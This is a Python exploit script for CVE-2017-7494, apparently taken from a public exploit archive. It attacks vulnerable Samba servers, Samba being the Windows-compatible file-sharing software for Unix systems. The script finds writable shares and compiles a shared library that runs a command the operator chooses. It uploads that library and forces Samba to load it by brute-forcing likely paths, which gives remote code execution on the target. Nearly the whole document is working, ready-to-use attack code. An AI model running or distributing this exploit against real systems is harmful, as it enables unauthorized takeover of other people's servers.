# coding=utf-8
# Exploit Title: Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution
# Date: 2017-05-31
# Exploit Author: avfisher (https://github.com/brianwrf/SambaHunter)
# Vendor Homepage: https://www.samba.org/
# Software Link: https://www.samba.org/samba/download/
# Version: 3.5.0 - 4.5.4/4.5.10/4.4.14
# Tested on: Ubuntu 16.04
# CVE : CVE-2017-7494

import commands
import sys
import re
import smbclient
import os
import argparse

share_type = [ 'DISK', 'PRINTER', 'DEVICE', 'IPC', 'SPECIAL', 'TEMPORARY' ]
share_common_location = [ '/volume1', '/volume2', '/volume3', '/shared', '/mnt', '/mnt/usb', '/media', '/mnt/media', '/var/samba', '/tmp', '/home', '/home/shared' ]
temp_file_name = "temp_file"

def generate_payload(file_name, cmd):
    content = '''
    # include <stdio.h>
    # include <stdlib.h>
    int samba_init_module()
    {
        system("%s");
        return 0;
    }''' % cmd

    payload = open(file_name + ".c", 'wb')
    payload.write(content.strip())
    payload.close()

    compile_cmd = "gcc %s.c -shared -fPIC -o %s.so" % (file_name, file_name)
    (status, output) = commands.getstatusoutput(compile_cmd)
    if status == 0:
        print "[*] Generate payload succeed: %s.so" % (os.path.dirname(os.path.realpath(__file__)) + '/' + file_name)
        return file_name
    else:
        print "[!] Generate payload failed!"
        exit()

def connect_smb(server, share_name):
    smb = smbclient.SambaClient(server=server, share=share_name)
    return smb

def verify_writeable_directory(smb):
    file_name = temp_file_name
    temp_file = open(file_name, 'w')
    temp_file.write('test')
    temp_file.close()
    smb.upload(file_name, file_name)
    if file_name in smb.listdir("/"):
        try:
            smb.remove(file_name)
        except Exception, err:
            pass
        return True
    return False

def upload_payload(smb, cmd):
    payload_name = 'samba_' + str(os.getpid())
    payload = generate_payload(payload_name, cmd)
    try:
        smb.upload(payload + '.so', payload + '.so')
    except Exception, err:
        pass
    os.remove(payload + '.so')
    os.remove(payload + '.c')
    return payload

def brute_force_location(payload):
    paths = []
    for location in share_common_location:
        paths.append(location + '/' + payload + '.so')
    return paths

def exploit(server, path):
    print "[+] Brute force exploit: %s" % path
    cmd = "smbclient //%s/IPC$ -k -c 'open %s'" % (server, path)
    (status, output) = commands.getstatusoutput(cmd)

def scan_share(server, share_name, cmd):
    try:
        smb = connect_smb(server, share_name)
        if verify_writeable_directory(smb):
            payload = upload_payload(smb, cmd)
            paths = brute_force_location(payload)
            for path in paths:
                exploit(server, path)
            try:
                smb.remove(payload + '.so')
            except Exception, err:
                pass
        smb.close()
    except Exception, err:
        pass

def main():
    banner = """

  ____                  _           _   _             _            
 / ___|  __ _ _ __ ___ | |__   __ _| | | |_   _ _ __ | |_ ___ _ __ 
 \___ \ / _` | '_ ` _ \| '_ \ / _` | |_| | | | | '_ \| __/ _ \ '__|
  ___) | (_| | | | | | | |_) | (_| |  _  | |_| | | | | ||  __/ |   
 |____/ \__,_|_| |_| |_|_.__/ \__,_|_| |_|\__,_|_| |_|\__\___|_|   
                                                                   
    # Exploit Author: avfisher (https://github.com/brianwrf)
    # Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution
    # CVE-2017-7494
    # Help: python sambahunter.py -h
"""
    print banner
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", help="Server to target", type=str)
    parser.add_argument("-c", "--command", help="Command to execute on target server", type=str)
    args = parser.parse_args()
    
    server = ''
    cmd = ''

    if args.server:
        server = args.server
    if args.command:
        cmd = args.command

    if server and cmd:
        print "[*] Exploiting RCE for Samba (CVE-2017-7494)..."
        print "[*] Server: %s" % server
        list_share_cmd = "smbclient -L %s -N" % (server)
        (status, output) = commands.getstatusoutput(list_share_cmd)
        if status == 0:
            shares = output.split('\n\t')
            for share in shares:
                if 'Samba' in share:
                    match = re.search('.*(Samba.*?)].*', share)
                    if match:
                        print "[*] Samba version: %s" % match.group(1)
                for type in share_type:
                    if type.lower() in share.lower():
                        share_name = share.split(" ")[0]
                        scan_share(server, share_name, cmd)
            print "[*] Exploit finished!"
        else:
            print "[!] Exploit failed!"
            exit()
        os.remove(temp_file_name)

if __name__ == '__main__':
    main()
